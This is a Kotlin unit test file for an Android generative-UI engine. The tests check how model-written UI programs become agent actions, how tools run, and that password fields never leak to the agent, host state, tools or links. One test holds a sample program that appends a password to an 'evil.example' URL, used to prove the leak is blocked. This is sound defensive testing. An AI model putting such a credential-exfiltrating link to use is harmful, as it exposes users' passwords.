/*
 * Copyright (c) 2014-2026 Stream.io Inc. All rights reserved.
 *
 * Licensed under the Stream License;
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *    https://github.com/GetStream/stream-chat-android/blob/main/LICENSE
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package io.getstream.chat.android.ai.openui.generativeui

import io.getstream.chat.android.ai.compose.generativeui.AIUIAction
import io.getstream.chat.android.ai.compose.generativeui.AIUIComponent
import io.getstream.chat.android.ai.compose.generativeui.AIUIComponentDefinition
import io.getstream.chat.android.ai.compose.generativeui.AIUIDocument
import io.getstream.chat.android.ai.compose.generativeui.AIUIFormat
import io.getstream.chat.android.ai.compose.generativeui.AIUIHost
import io.getstream.chat.android.ai.compose.generativeui.AIUIParameter
import io.getstream.chat.android.ai.compose.generativeui.AIUIParameterType
import io.getstream.chat.android.ai.compose.parts.AIClientTool
import io.getstream.chat.android.ai.compose.parts.AIClientToolResult
import io.getstream.chat.android.ai.compose.parts.AIToolCallPart
import io.getstream.chat.android.ai.openui.lang.ActionEvent
import io.getstream.chat.android.ai.openui.lang.BuiltinActionType
import io.getstream.chat.android.ai.openui.lang.ElementNode
import io.getstream.chat.android.ai.openui.lang.OpenUIError
import io.getstream.chat.android.ai.openui.lang.OpenUIObject
import io.getstream.chat.android.ai.openui.lang.OpenUIRuntime
import io.getstream.chat.android.ai.openui.lang.OpenUIValue
import io.getstream.chat.android.ai.openui.lang.elementValue
import io.getstream.chat.android.ai.openui.lang.get
import io.getstream.chat.android.ai.openui.rendering.openuiChatLibrary
import kotlinx.coroutines.test.TestScope
import kotlinx.coroutines.test.runTest
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertNotNull
import kotlin.test.assertNull
import kotlin.test.assertSame
import kotlin.test.assertTrue
import kotlin.time.Duration.Companion.seconds

internal class OpenUIEngineTest {

    private companion object {
        const val Untitled = "Continue"
    }

    private val sent = mutableListOf<AIUIAction>()
    private val placeCard = AIUIComponent(
        AIUIComponentDefinition(
            name = "place_card",
            description = "A place.",
            parameters = listOf(AIUIParameter.required("title", AIUIParameterType.String)),
        ),
    ) { _, _ -> }

    private val errors = mutableListOf<Pair<String, String>>()

    private fun TestScope.engine(host: AIUIHost = host()): OpenUIEngine = OpenUIEngine(
        openuiChatLibrary,
        host,
        HostToolProvider(host),
        onError = { error, messageId -> errors += error.code to messageId },
        scope = backgroundScope,
    )

    private fun host(tools: List<AIClientTool> = emptyList()) =
        AIUIHost(renderers = listOf(OpenUIRenderer()), components = listOf(placeCard), tools = tools) { sent += it }

    private fun reply(program: String, isStreaming: Boolean = false) =
        AIUIDocument(AIUIFormat.OpenUI, isStreaming = isStreaming, content = program)

    @Test
    fun `an OpenUI action reaches the agent shaped like on every platform`() {
        val event = ActionEvent(
            type = BuiltinActionType.CONTINUE_CONVERSATION,
            params = OpenUIObject.of("context" to OpenUIValue.Str("hotel-7"), "night" to OpenUIValue.Num(2.0)),
            humanFriendlyMessage = "Book it",
            formState = OpenUIObject.of("booking" to OpenUIValue.obj("guests" to OpenUIValue.Num(3.0))),
            formName = "booking",
            label = "Book it",
        )

        val action = OpenUIEngine.action(event, "m1", Untitled)

        assertEquals(
            AIUIAction(
                messageId = "m1",
                format = AIUIFormat.OpenUI,
                name = "continue_conversation",
                label = "Book it",
                payload = mapOf(
                    "context" to "hotel-7",
                    "params" to mapOf("night" to 2),
                    "form" to "booking",
                    "values" to mapOf("booking" to mapOf("guests" to 3)),
                ),
            ),
            action,
        )
    }

    @Test
    fun `an action is labeled with the control, never its context or type`() {
        val withContext = ActionEvent(
            "continue_conversation",
            OpenUIObject.of("context" to OpenUIValue.Str("More")),
            humanFriendlyMessage = "",
        )
        val custom = ActionEvent("add_to_cart", OpenUIObject.of("sku" to OpenUIValue.Str("a1")), humanFriendlyMessage = "")

        assertEquals(Untitled, OpenUIEngine.action(withContext, "m1", Untitled)?.label)
        assertEquals(mapOf<String, Any?>("context" to "More"), OpenUIEngine.action(withContext, "m1", Untitled)?.payload)
        assertEquals(Untitled, OpenUIEngine.action(custom, "m1", Untitled)?.label)
        assertEquals(mapOf("params" to mapOf("sku" to "a1")), OpenUIEngine.action(custom, "m1", Untitled)?.payload)
    }

    @Test
    fun `the model's words for an action go to the agent, the tapped control is the person's message`() = runTest {
        val engine = engine()
        engine.content(reply("root = Card([Button(\"Cancel\", @ToAssistant(\"Yes, book the flight\"))])"), "m1")
        val runtime = assertNotNull(engine.runtime("m1"))

        runtime.triggerAction("Cancel", action = firstChild(runtime).props["action"])

        val action = sent.single()
        assertEquals("Cancel", action.label)
        assertEquals("Yes, book the flight", action.payload["message"])
    }

    @Test
    fun `a link is no action for the agent`() {
        val link = ActionEvent("open_url", OpenUIObject.of("url" to OpenUIValue.Str("https://example.com")), "")
        assertNull(OpenUIEngine.action(link, "m1", Untitled))
    }

    @Test
    fun `only the action's own form goes to the agent, without what password fields hold`() {
        val state = OpenUIObject.of(
            "login" to OpenUIValue.obj(
                "email" to OpenUIValue.obj("value" to OpenUIValue.Str("ana@example.com")),
                "password" to OpenUIValue.obj("value" to OpenUIValue.Str("hunter2"), "secret" to OpenUIValue.of(true)),
            ),
        )
        val inForm = ActionEvent("continue_conversation", humanFriendlyMessage = "", formState = state, formName = "login")
        val outside = ActionEvent("continue_conversation", humanFriendlyMessage = "", formState = state)

        val values = OpenUIEngine.action(inForm, "m1", Untitled)?.payload?.get("values")
        assertEquals(mapOf("login" to mapOf("email" to mapOf("value" to "ana@example.com"))), values)
        assertEquals(emptyMap(), OpenUIEngine.action(outside, "m1", Untitled)?.payload)
    }

    @Test
    fun `a password reaches neither the agent nor the host's state`() = runTest {
        val host = host()
        val engine = engine(host)
        val program = "root = Card([Form(\"login\", Buttons([Button(\"Sign in\")]), " +
            "[FormControl(\"Email\", Input(\"email\")), FormControl(\"Password\", Input(\"password\", \"\", \"password\"))])])"
        engine.content(reply(program), "m1")
        val runtime = assertNotNull(engine.runtime("m1"))
        runtime.stateField("email", null, "login", "Input").setValue(OpenUIValue.Str("ana@example.com"))
        runtime.stateField("password", null, "login", "Input", isSecret = true).setValue(OpenUIValue.Str("hunter2"))

        runtime.triggerAction("Sign in", "login")

        val state = host.state("m1").toString()
        assertTrue("ana@example.com" in state)
        assertFalse("hunter2" in state)
        assertFalse("hunter2" in sent.single().json.toString())
        assertTrue("ana@example.com" in sent.single().json.toString())
    }

    @Test
    fun `a password bound to a variable stays out of it`() = runTest {
        val engine = engine()
        engine.content(reply("\$pass = \"\"\nroot = Card([Input(\"pass\", \"\", \"password\", null, \$pass)])"), "m1")
        val runtime = assertNotNull(engine.runtime("m1"))
        val binding = firstChild(runtime).props["value"]

        runtime.stateField("pass", binding, null, "Input", isSecret = true).setValue(OpenUIValue.Str("hunter2"))

        assertEquals(OpenUIValue.Str(""), runtime.store["\$pass"])
    }

    @Test
    fun `a password named like a variable stays out of what an action says`() = runTest {
        val engine = engine()
        val program = "root = Card([Input(\"\$pw\", \"\", \"password\"), " +
            "Button(\"Go\", @ToAssistant(\"pw is \" + \$pw))])"
        engine.content(reply(program), "m1")
        val runtime = assertNotNull(engine.runtime("m1"))
        val field = runtime.stateField("\$pw", null, null, "Input", isSecret = true)
        field.setValue(OpenUIValue.Str("hunter2"))

        runtime.triggerAction("Go", action = element(runtime, "Button").props["action"])

        assertEquals(OpenUIValue.Str("hunter2"), runtime.stateField("\$pw", null, null, "Input", isSecret = true).value)
        assertFalse("hunter2" in sent.single().json.toString())
    }

    @Test
    fun `a password named like a variable stays out of a link`() = runTest {
        val engine = engine()
        val program = "root = Card([Input(\"\$pw\", \"\", \"password\"), " +
            "Button(\"Go\", @OpenUrl(\"https://evil.example/?p=\" + \$pw))])"
        engine.content(reply(program), "m1")
        val runtime = assertNotNull(engine.runtime("m1"))
        val events = mutableListOf<ActionEvent>()
        runtime.onAction = { events += it }
        runtime.stateField("\$pw", null, null, "Input", isSecret = true).setValue(OpenUIValue.Str("hunter2"))

        runtime.triggerAction("Go", action = element(runtime, "Button").props["action"])

        val url = assertNotNull(events.single { it.isOpenUrl }.params["url"]).toString()
        assertFalse("hunter2" in url)
    }

    @Test
    fun `a password named like a variable never reaches a query's tool`() = runTest {
        val calls = mutableListOf<AIToolCallPart>()
        val tool = object : AIClientTool {
            override val name = "lookup"
            override val isReadOnly = true
            override suspend fun run(call: AIToolCallPart): AIClientToolResult {
                calls += call
                return AIClientToolResult.completed("{}")
            }
        }
        val engine = engine(host(listOf(tool)))
        val program = """
            data = Query("lookup", {p: ${'$'}pw}, {})
            root = Card([Input("${'$'}pw", "", "password")])
        """.trimIndent()
        engine.content(reply(program), "m1")
        val runtime = assertNotNull(engine.runtime("m1"))
        testScheduler.advanceTimeBy(1.seconds)
        testScheduler.runCurrent()

        runtime.stateField("\$pw", null, null, "Input", isSecret = true).setValue(OpenUIValue.Str("hunter2"))
        testScheduler.advanceTimeBy(1.seconds)
        testScheduler.runCurrent()

        assertTrue(calls.isNotEmpty())
        assertTrue(calls.none { "hunter2" in it.arguments.orEmpty() })
    }

    @Test
    fun `a password in a form named like a variable stays out of an action's context`() = runTest {
        val engine = engine()
        val program = "root = Card([Form(\"\$f\", Buttons([Button(\"Go\", @ToAssistant(\"x\", \$f.pw.value))]), " +
            "[FormControl(\"Password\", Input(\"pw\", \"\", \"password\"))])])"
        engine.content(reply(program), "m1")
        val runtime = assertNotNull(engine.runtime("m1"))
        runtime.stateField("pw", null, "\$f", "Input", isSecret = true).setValue(OpenUIValue.Str("hunter2"))

        runtime.triggerAction("Go", "\$f", element(runtime, "Button").props["action"])

        assertEquals(OpenUIValue.Str("hunter2"), runtime.fieldValue("\$f", "pw"))
        assertFalse("hunter2" in sent.single().json.toString())
    }

    @Test
    fun `a reply's problems reach the app with its message id`() = runTest {
        val engine = engine()
        assertNotNull(engine.content(reply("root = Card([Nope(\"x\")])"), "m1"))

        assertTrue(errors.isNotEmpty())
        assertTrue(errors.all { it.second == "m1" })
    }

    @Test
    fun `a reply keeps its runtime, which follows its program`() = runTest {
        val engine = engine()
        val partial = "root = Card([TextContent(\"Oh"

        assertNotNull(engine.content(reply(partial, isStreaming = true), "m1"))
        val runtime = assertNotNull(engine.runtime("m1"))
        assertEquals(partial, runtime.response)

        val program = "root = Card([TextContent(\"Ohrid\")])"
        engine.receive(reply(program), "m1")
        engine.content(reply(program), "m1")

        assertSame(runtime, engine.runtime("m1"))
        assertEquals(program, runtime.response)
        assertEquals(false, runtime.isStreaming)
        assertEquals("Card", runtime.root?.typeName)
    }

    @Test
    fun `a reply that never showed has no runtime`() = runTest {
        val engine = engine()
        engine.receive(reply("root = Card([])"), "m1")
        assertNull(engine.runtime("m1"))
        assertNull(engine.content(AIUIDocument(AIUIFormat.OpenUI, content = listOf(1)), "m1"))
    }

    @Test
    fun `a finished reply with nothing to draw shows its text`() = runTest {
        val engine = engine()
        assertNotNull(engine.content(reply("Just prose, still coming", isStreaming = true), "m1"))

        assertNull(engine.content(reply("Just prose, all of it"), "m1"))
        assertNull(engine.runtime("m1"))
        assertNull(engine.content(reply("\$x = 1\nroot = \$x"), "m2"))
    }

    @Test
    fun `a reply that loses its program stops its runtime`() = runTest {
        val engine = engine()
        engine.content(reply("root = Card([])"), "m1")
        assertNotNull(engine.runtime("m1"))

        engine.receive(AIUIDocument(AIUIFormat.OpenUI, content = listOf(1)), "m1")

        assertNull(engine.runtime("m1"))
    }

    @Test
    fun `a reply that leaves the conversation stops its runtime`() = runTest {
        val engine = engine()
        engine.content(reply("root = Card([])"), "m1")
        assertNotNull(engine.runtime("m1"))

        engine.remove("m1")

        assertNull(engine.runtime("m1"))
    }

    @Test
    fun `a reply's state is kept by the host, and restored`() = runTest {
        val host = host()
        val program = "\$name = \"\"\nroot = Card([Input(\"name\", \"Your name\", \"text\", null, \$name)])"
        val first = engine(host)
        first.content(reply(program), "m1")
        assertNotNull(first.runtime("m1")).setFieldValue(null, "Input", "\$name", OpenUIValue.Str("Ana"))

        val state = host.state("m1") as Map<*, *>
        assertEquals("Ana", (state["\$name"] as Map<*, *>)["value"])

        val second = engine(host)
        second.content(reply(program), "m1")
        assertEquals(OpenUIValue.Str("Ana"), assertNotNull(second.runtime("m1")).fieldValue(null, "\$name"))
    }

    @Test
    fun `a follow-up reaches the host as the person's message`() = runTest {
        val engine = engine()
        engine.content(reply("root = Card([FollowUpBlock([FollowUpItem(\"Tell me more\")])])"), "m1")

        assertNotNull(engine.runtime("m1")).triggerAction("Tell me more")

        val action = sent.single()
        assertEquals("m1", action.messageId)
        assertEquals("continue_conversation", action.name)
        assertEquals("Tell me more", action.label)
    }

    @Test
    fun `the app's components are placed by their OpenUI name`() = runTest {
        val engine = engine()
        engine.content(reply("root = Card([PlaceCard(\"Ohrid\")])"), "m1")

        assertNotNull(engine.library.renderer("PlaceCard"))
        val card = assertNotNull(engine.runtime("m1")?.root)
        val child = (card.props["children"] as OpenUIValue.Arr).items.single() as OpenUIValue.Element
        assertEquals("PlaceCard", child.node.typeName)
        assertEquals(OpenUIValue.Str("Ohrid"), child.node.props["title"])
    }

    @Test
    fun `every built-in part comes in as it shows`() = runTest {
        val engine = engine()
        openuiChatLibrary.components.values.forEach { component ->
            val renderer = engine.library.renderer(component.name)
            if (component.component == null) assertNull(renderer) else assertNotNull(renderer)
        }
    }

    private fun firstChild(runtime: OpenUIRuntime): ElementNode {
        val card = assertNotNull(runtime.root)
        return assertNotNull((card.props["children"] as OpenUIValue.Arr).items.first().elementValue)
    }

    // The first element named [typeName] in the rendered tree, depth first.
    private fun element(runtime: OpenUIRuntime, typeName: String): ElementNode {
        fun find(value: OpenUIValue?): ElementNode? = when (value) {
            is OpenUIValue.Element -> value.node.takeIf { it.typeName == typeName }
                ?: value.node.props.values.firstNotNullOfOrNull(::find)
            is OpenUIValue.Arr -> value.items.firstNotNullOfOrNull(::find)
            else -> null
        }
        return assertNotNull(find(OpenUIValue.Element(assertNotNull(runtime.root))))
    }

    @Test
    fun `queries run the host's tools`() = runTest {
        val tool = object : AIClientTool {
            override val name = "weather"
            override val isReadOnly = true
            override suspend fun run(call: AIToolCallPart) = AIClientToolResult.completed("{\"temperature\":21.5}")
        }
        val provider = HostToolProvider(host(listOf(tool)))

        val output = provider.callTool("weather", OpenUIObject.of("city" to OpenUIValue.Str("Ohrid")))

        assertEquals(OpenUIValue.obj("temperature" to OpenUIValue.Num(21.5)), output)
    }

    @Test
    fun `a tool that changes something runs from a tapped Mutation, never from a Query`() = runTest {
        var runs = 0
        val tool = object : AIClientTool {
            override val name = "save"
            override suspend fun run(call: AIToolCallPart): AIClientToolResult {
                runs++
                return AIClientToolResult.completed("{\"saved\":true}")
            }
        }
        val engine = engine(host(listOf(tool)))
        val program = """
            data = Query("save", {}, {saved: false})
            act = Mutation("save", {})
            root = Card([Button("Save", Action([@Run(act)]))])
        """.trimIndent()
        engine.content(reply(program), "m1")
        val runtime = assertNotNull(engine.runtime("m1"))
        // The runtime works in the background, so time is moved on by hand.
        testScheduler.advanceTimeBy(1.seconds)
        testScheduler.runCurrent()

        assertEquals(0, runs)
        val error = runtime.queryManager.snapshot.value.errors.single { it.source == OpenUIError.Source.Query }
        assertEquals("save", error.toolName)
        assertEquals(OpenUIValue.obj("saved" to OpenUIValue.Bool(false)), runtime.queryManager.result("data"))

        runtime.triggerAction("Save", action = firstChild(runtime).props["action"])

        assertEquals(1, runs)
        assertEquals(OpenUIValue.Str("success"), runtime.queryManager.mutationResult("act")["status"])
    }
}
